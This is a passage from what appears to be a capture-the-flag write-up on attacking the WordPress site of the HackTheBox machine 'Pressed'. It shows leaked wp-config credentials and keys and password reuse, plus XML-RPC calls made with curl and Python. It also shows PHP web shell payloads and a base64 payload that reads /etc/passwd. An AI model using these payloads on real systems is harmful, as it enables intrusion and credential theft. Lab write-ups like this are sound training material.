</span></span><span style="display:flex;"><span>[+] Memory used: 250.23 MB
</span></span><span style="display:flex;"><span>[+] Elapsed time: 00:00:03
</span></span></code></pre></div><p>Let&rsquo;s try to brute-force the admin user while we try to further exploit this file disclosure vulnerability. After starting the scan, we notice that <code>wpscan</code> identifies a backup file</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Enumerating Config Backups (via Passive and Aggressive Methods)
</span></span><span style="display:flex;"><span> Checking Config Backups - Time: 00:00:00 &lt;====================================================================================&gt; (137 / 137) 100.00% Time: 00:00:00
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[i] Config Backup(s) Identified:
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[!] http://10.10.11.142/wp-config.php.bak
</span></span><span style="display:flex;"><span> | Found By: Direct Access (Aggressive Detection)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
</span></span></code></pre></div><p>Navigating to the URL allows us to download the file</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">http://10.10.11.142/wp-config.php.bak
</span></span></span></code></pre></div><p>In the <code>.bak</code> file, we find credentials for a database and some keys</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> 21 // ** Database settings - You can get this info from your web host ** //$
</span></span><span style="display:flex;"><span> 22 /** The name of the database for WordPress */$
</span></span><span style="display:flex;"><span> 23 define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );$
</span></span><span style="display:flex;"><span> 24 $
</span></span><span style="display:flex;"><span> 25 /** Database username */$
</span></span><span style="display:flex;"><span> 26 define( &#39;DB_USER&#39;, &#39;admin&#39; );$
</span></span><span style="display:flex;"><span> 27 $
</span></span><span style="display:flex;"><span> 28 /** Database password */$
</span></span><span style="display:flex;"><span> 29 define( &#39;DB_PASSWORD&#39;, &#39;uhc-jan-finals-2021&#39; );$
</span></span><span style="display:flex;"><span> 30 $
</span></span><span style="display:flex;"><span> 31 /** Database hostname */$
</span></span><span style="display:flex;"><span> 32 define( &#39;DB_HOST&#39;, &#39;localhost&#39; );$
</span></span><span style="display:flex;"><span> 33 $
</span></span><span style="display:flex;"><span> 34 /** Database charset to use in creating database tables. */$
</span></span><span style="display:flex;"><span> 35 define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; );$
</span></span><span style="display:flex;"><span> 36 $
</span></span><span style="display:flex;"><span> 37 /** The database collate type. Don&#39;t change this if in doubt. */$
</span></span><span style="display:flex;"><span> 38 define( &#39;DB_COLLATE&#39;, &#39;&#39; );$
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt; 
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>define( &#39;AUTH_KEY&#39;,         &#39;3MYXll40,8gfj_jX4!3J(278f1(SGEZ+v]#w]Bu&lt;PrstLLHEZig,MJB#t E2pU2t&#39; );$
</span></span><span style="display:flex;"><span> 52 define( &#39;SECURE_AUTH_KEY&#39;,  &#39;QPkQ%%h&amp;5$3$C;Z}2N!LKz.O 57i2U.582Gy{C=$XV_(jJz~3gC=*nKP//{v{?n&lt;&#39; );$
</span></span><span style="display:flex;"><span> 53 define( &#39;LOGGED_IN_KEY&#39;,    &#39;rp}RE/3-_3OF%./6PH` 1zbCy#H22NRH,ETR(c2*Qlu&amp;W&gt;lW|::4T[iFx%W|%[hA&#39; );$
</span></span><span style="display:flex;"><span> 54 define( &#39;NONCE_KEY&#39;,        &#39;#%s&amp;zIE/mSuvN{+2]^n;21]|u;gmP6!-ihyCn91j{/.KRGbg8}{3C%kZ#$(i&amp;bc-&#39; );$
</span></span><span style="display:flex;"><span> 55 define( &#39;AUTH_SALT&#39;,        &#39;,7BVMi:h`][Q/3j8tHN*EjKk,jY|+hm.3OnjYS A$ArIx7B z]WzLJ$Tc7&lt;/s`td&#39; );$
</span></span><span style="display:flex;"><span> 56 define( &#39;SECURE_AUTH_SALT&#39;, &#39;]s_RJ,%OLa.}_8wP Qeu9WJUhJ2Zd2I%&gt;T5R#f{8op9:Hn??}7{ZJ*.K.t/{lVl0&#39; );$
</span></span><span style="display:flex;"><span> 57 define( &#39;LOGGED_IN_SALT&#39;,   &#39;wwQj(p&amp;1I8zAK!2lhR[xg.Vt`qeh|2R}HMz?~TuQ9QE*@iy?@*?pDV;[4BL9*n#W&#39; );$
</span></span><span style="display:flex;"><span> 58 define( &#39;NONCE_SALT&#39;,       &#39;[Wv%%EDN&lt;b/a_&lt;/u|snqMQ q)xPW8GyB4WAw f+1k2|IFbu*7#U(g-# l{Kw n6Z&#39; );$
</span></span><span style="display:flex;"><span> 59 $
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
</span></span></code></pre></div><p>There is a few things we can do here. There&rsquo;s no direct access to the database (we didn&rsquo;t see anymore ports open), so that&rsquo;s probably not it. We have the various keys here which it is possible to forge an admin session cookie. However, <strong>always check password reuse!!!</strong> The admin password for the database may be the same as the WordPress login.</p>
<p>We try the password <code>uhc-jan-finals-2021</code>, but that is wrong. This is where the box can be confusing because at the time it was made (2022). You may try multiple different years to see if the password has been updated (update from 2021 to 2022) which ends up working. This was very difficult because it is a big hit or miss with guessing. After entering that password, we get redirected to enter a <code>Valid OTP</code>
<img src="/images/Pressed/otp.png" alt="OTP"></p>
<p>So we have the admin password, but we are blocked by a pin. The pin doesn&rsquo;t look brute-forceable, but we do have a file disclosure vulnerability. However, unless the pin is being generated in a predictable fashion, we can&rsquo;t really forge one.</p>
<p>However, remember that <code>XML-RPC</code> was identified by <code>wpscan</code>. <code>XML-RPC</code> is an API for interacting with WordPress. This is important for us because this is done programmatically instead of through a GUI, which we are blocked from accessing due to the MTA. Can we potentially use <code>XML-RPC</code> to gain initial access?</p>
<p>From the <a href="https://codex.wordpress.org/XML-RPC/system.listMethods">docs</a>, we can list the available methods</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$curl -X POST http://pressed.htb/xmlrpc.php -d <span style="color:#e6db74">&#39;&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;/methodName&gt;&lt;/methodCall&gt;&#39;</span>
</span></span><span style="display:flex;"><span>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span><span style="display:flex;"><span>&lt;methodResponse&gt;
</span></span><span style="display:flex;"><span>  &lt;params&gt;
</span></span><span style="display:flex;"><span>    &lt;param&gt;
</span></span><span style="display:flex;"><span>      &lt;value&gt;
</span></span><span style="display:flex;"><span>      &lt;array&gt;&lt;data&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;system.multicall&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;system.listMethods&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;system.getCapabilities&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;htb.get_flag&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;demo.addTwoNumbers&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;demo.sayHello&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;pingback.extensions.getPingbacks&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;pingback.ping&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;mt.publishPost&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;mt.getTrackbackPings&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;mt.supportedTextFilters&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;mt.supportedMethods&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;mt.setPostCategories&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;mt.getPostCategories&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;mt.getRecentPostTitles&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;mt.getCategoryList&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;metaWeblog.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;metaWeblog.deletePost&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;metaWeblog.newMediaObject&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;metaWeblog.getCategories&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;metaWeblog.getRecentPosts&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;metaWeblog.getPost&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;metaWeblog.editPost&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;metaWeblog.newPost&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;blogger.deletePost&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;blogger.editPost&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;blogger.newPost&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;blogger.getRecentPosts&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;blogger.getPost&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;blogger.getUserInfo&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;blogger.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.restoreRevision&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getRevisions&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getPostTypes&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getPostType&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getPostFormats&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getMediaLibrary&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getMediaItem&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getCommentStatusList&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.newComment&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.editComment&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.deleteComment&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getComments&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getComment&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.setOptions&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getOptions&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getPageTemplates&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getPageStatusList&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getPostStatusList&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getCommentCount&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.deleteFile&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.uploadFile&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.suggestCategories&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.deleteCategory&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.newCategory&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getTags&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getCategories&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getAuthors&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getPageList&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.editPage&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.deletePage&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.newPage&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getPages&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getPage&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.editProfile&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getProfile&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getUsers&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getUser&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getTaxonomies&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getTaxonomy&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getTerms&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getTerm&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.deleteTerm&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.editTerm&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.newTerm&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getPosts&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getPost&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.deletePost&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.editPost&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.newPost&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>  &lt;value&gt;&lt;string&gt;wp.getUsersBlogs&lt;/string&gt;&lt;/value&gt;
</span></span><span style="display:flex;"><span>&lt;/data&gt;&lt;/array&gt;
</span></span><span style="display:flex;"><span>      &lt;/value&gt;
</span></span><span style="display:flex;"><span>    &lt;/param&gt;
</span></span><span style="display:flex;"><span>  &lt;/params&gt;
</span></span><span style="display:flex;"><span>&lt;/methodResponse&gt;
</span></span></code></pre></div><p>We notice a unique method in there called <code>htp.get_flag</code>. Let&rsquo;s try it and see if we get a flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$curl -X POST http://pressed.htb/xmlrpc.php -d <span style="color:#e6db74">&#39;&lt;methodCall&gt;&lt;methodName&gt;htb.get_flag&lt;/methodName&gt;&lt;/methodCall&gt;&#39;</span>
</span></span><span style="display:flex;"><span>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span><span style="display:flex;"><span>&lt;methodResponse&gt;
</span></span><span style="display:flex;"><span>  &lt;params&gt;
</span></span><span style="display:flex;"><span>    &lt;param&gt;
</span></span><span style="display:flex;"><span>      &lt;value&gt;
</span></span><span style="display:flex;"><span>      &lt;string&gt;01c85d5352af3765f1caf6a3581a977f
</span></span><span style="display:flex;"><span>&lt;/string&gt;
</span></span><span style="display:flex;"><span>      &lt;/value&gt;
</span></span><span style="display:flex;"><span>    &lt;/param&gt;
</span></span><span style="display:flex;"><span>  &lt;/params&gt;
</span></span><span style="display:flex;"><span>&lt;/methodResponse&gt;
</span></span></code></pre></div><p>Nice! That&rsquo;s the user flag. Usually with WordPress, I&rsquo;m looking to get admin access and then edit a page so that it includes code for a web shell. Trying this programmatically by editing the post did not work. However, when inspecting the post after I wrote my PHP code there, we see what looks like base64-encoded data and a reference to <code>php-everywhere</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#f92672">from</span> wordpress_xmlrpc <span style="color:#f92672">import</span> Client
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#f92672">from</span> wordpress_xmlrpc.methods <span style="color:#f92672">import</span> posts
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> client <span style="color:#f92672">=</span> Client(<span style="color:#e6db74">&#39;http://pressed.htb/xmlrpc.php&#39;</span>, <span style="color:#e6db74">&#39;admin&#39;</span>, <span style="color:#e6db74">&#39;uhc-jan-finals-2022&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> plist <span style="color:#f92672">=</span> client<span style="color:#f92672">.</span>call(posts<span style="color:#f92672">.</span>GetPosts())
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> plist[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>content
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&lt;!-- wp:paragraph --&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;p&gt;The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.&lt;/p&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;!-- /wp:paragraph --&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;!-- wp:php-everywhere-block/php {&#34;code&#34;:&#34;JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=&#34;,&#34;version&#34;:&#34;3.0.0&#34;} /--&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;!-- wp:paragraph --&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;p&gt;&lt;/p&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;!-- /wp:paragraph --&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;!-- wp:paragraph --&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;p&gt;&lt;/p&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;!-- /wp:paragraph --&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;?php system($_REQUEST[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">cmd</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">]); ?&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;?php system($_REQUEST[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">cmd</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">]); ?&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;?php</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">if(isset($_GET[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">cmd</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">])) {</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">    echo &#34;&lt;pre&gt;&#34; . shell_exec($_GET[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">cmd</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">]) . &#34;&lt;/pre&gt;&#34;;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">?&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;?php system($_REQUEST[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">cmd</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">]); ?&gt;&#39;</span>
</span></span></code></pre></div><p>If we decode this, we can see that it is echoing <code>/var/www/html/output.log</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$echo -n <span style="color:#e6db74">&#34;JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=&#34;</span> | base64 -d
</span></span><span style="display:flex;"><span>%3C%3Fphp%20%20echo<span style="color:#f92672">(</span>file_get_contents<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;%2Fvar%2Fwww%2Fhtml%2Foutput.log&#39;</span><span style="color:#f92672">))</span>%3B%20%3F%3E
</span></span></code></pre></div><p>Can we just replace this with our own base64 code asking it to display something like <code>/etc/passwd</code>? Let&rsquo;s try. First we encode our payload</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$echo -n <span style="color:#e6db74">&#34;%3C%3Fphp%20%20echo(file_get_contents(&#39;%2Fetc%2Fpasswd&#39;))%3B%20%3F%3E&#34;</span> | base64 -w <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGZXRjJTJGcGFzc3dkJykpJTNCJTIwJTNGJTNF
</span></span></code></pre></div><p>Note: I added <code>-w 0</code> or else base64 will wrap it and you&rsquo;ll have to delete that newline. The default is to wrap after 76 COLS. You can see this in the man page for <code>base64</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>       -w, --wrap=COLS
</span></span><span style="display:flex;"><span>              wrap encoded lines after COLS character (default 76).  Use 0 to disable line wrapping
</span></span></code></pre></div><p>Then we need to replace the content in the blog post with our own</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> plist[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>content
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&lt;!-- wp:paragraph --&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;p&gt;The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.&lt;/p&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;!-- /wp:paragraph --&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;!-- wp:php-everywhere-block/php {&#34;code&#34;:&#34;JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=&#34;,&#34;version&#34;:&#34;3.0.0&#34;} /--&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;!-- wp:paragraph --&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;p&gt;&lt;/p&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;!-- /wp:paragraph --&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;!-- wp:paragraph --&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;p&gt;&lt;/p&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&lt;!-- /wp:paragraph --&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;?php system($_REQUEST[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">cmd</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">]); ?&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;?php system($_REQUEST[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">cmd</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">]); ?&gt;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&lt;?php</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">if(isset($_GET[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">cmd</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">])) {</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">    echo &#34;&lt;pre&gt;&#34; . shell_exec($_GET[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">cmd</span><span 